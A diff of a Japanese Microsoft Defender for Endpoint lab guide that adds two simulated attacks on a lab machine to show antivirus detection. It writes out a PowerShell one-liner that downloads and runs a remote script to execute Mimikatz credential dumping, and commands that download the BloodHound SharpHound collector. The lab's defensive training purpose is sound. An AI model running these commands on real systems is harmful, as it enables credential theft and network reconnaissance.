@@ -4,20 +4,47 @@
 
 ## シミュレーション攻撃
 
-このタスクでは、シミュレーション攻撃を 1 回行って、Microsoft Defender for Endpoint の機能を確認します。
+このタスクでは、シミュレートされた攻撃を 2 回行って、Microsoft Defender for Endpoint の機能を確認します。
 
-1. まだ、Microsoft Defender セキュリティ センターをブラウザーで開いていない場合は、Microsoft Defender セキュリティ センター (https://security.microsoft.com) に移動して、お使いになっているテナントの管理者としてログインします。
+1. ブラウザーで Microsoft Defender XDR ポータルにまだアクセスしていない場合は、テナントの管理者としてログインして、https://security.microsoft.com) の Microsoft Defender XDR に移動します。
 
-1. メニューから、 **[エンドポイント]** の下で、 **[評価とチュートリアル]** を選択し、左側から **[チュートリアルとシミュレーション]** を選択します。
+"WIN1" で "PowerShell" を使って "シミュレートされた" 攻撃を実行し、Microsoft Defender for Endpoint の機能を確認します。******
 
-1. **[チュートリアル]** タブを選択します。
+`Attack 1: Mimikatz - Credential Dumping`
 
-1. *[Automated investigation (backdoor)](自動調査 (バックドア))* に、シナリオを説明するメッセージが表示されます。 この段落の下にある **[Read the walkthrough](チュートリアルの読み取り)** をクリックします。 シミュレーションを実行する手順を含む新しいブラウザー タブが開きます。
+1. "WIN1" マシンで、検索バーに「**Command**」と入力し、**[管理者として実行]** を選びます。**
 
-1. 新しいブラウザー タブで、 **[シミュレーションの実行]** という名前のセクション (5 ページの手順 2 から) を見つけ、次の手順に従って攻撃を実行します。 **ヒント:** シミュレーション ファイル *RS4_WinATP-Intro-Invoice.docm* は、ポータルに戻り、 **[Get simulation file](シミュレーション ファイルの取得)** ボタンを選択して、前の手順で選択した **[Read the walkthrough](チュートリアルを読み取る)** の下に表示されます。
+1. 次のコマンドをコピーして、**[管理者:コマンド プロンプト]** ウィンドウに貼り付け、**Enter** キーを押して実行します。
 
-    1. **注:** エクスプロイトを使用してファイルを実行した後、[Microsoft 365 Defender セキュリティ センター](https://security.microsoft.com)に戻り、**[インシデント]** タブをクリックしてアラートを表示できます。 このガイドでは、移行およびブランド変更された *Microsoft Defender ATP ポータル*を誤って参照しています。
-    1. [インシデント] ページを開き、**[インシデントの管理]** をクリックします。 **[インシデントの解決]** をクリックして、アクティブなアラートをすべて解決します。
+    ```CommandPrompt
+    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
+    ```
 
+1. "アクセスが拒否されました" というメッセージと、"脅威が見つかりました" という `Microsoft Defender Antivirus, Windows Security Virus and threats protection` からのポップアップ メッセージが表示されます。****
+
+1. **[管理者:コマンド プロンプト]** ウィンドウで「**exit**」と入力し、**Enter** キーを押して終了します。
+
+`Attack 2: Bloodhound - Collection`
+
+1. "WIN1" マシンで、検索バーに「**PowerShell**」と入力し、**[Windows PowerShell]** を選び、**[管理者として実行]** を選びます。**
+
+1. 次のコマンドをコピーして、**[管理者:Windows PowerShell]** ウィンドウに貼り付け、**Enter** キーを押して実行します。
+
+    ```PowerShell
+    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
+    ```
+
+    >**注:**  コマンドのコピー、貼り付け、実行は、一度に 1 つずつ行うことをお勧めします。 "メモ帳" を開き、コマンドを一時ファイルにコピーすることで、これを行うことができます。** 最初のコマンドでは、"Atomic Red Team" フォルダーがあるのと同じフォルダーに、"ExternalPayloads" という名前のフォルダーが作成されます。**** 2 番目のコマンドでは、"BloodHound" GitHub リポジトリから "SharpHound.ps1" ファイルがダウンロードされ、"ExternalPayloads" フォルダーに保存されます。******
+
+1. [脅威が見つかりました] という `Windows Security Virus and threats protection` からのポップアップ メッセージが表示されます。**
+
+1. 次のコマンドをコピーして、**[管理者:Windows PowerShell]** ウィンドウに貼り付け、**Enter** キーを押して実行します。
+
+    ```PowerShell
+    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
+    ```
+
+1. 出力が *True* の場合、マルウェア ペイロード ファイルは Microsoft Defender ウイルス対策によって削除されていません。 出力が *False* の場合、マルウェア ペイロード ファイルは Microsoft Defender ウイルス対策によって削除されています。 上方向キーを使用して、出力が *False* になるまでコマンドを繰り返します。
 
 ## デモが完了しました
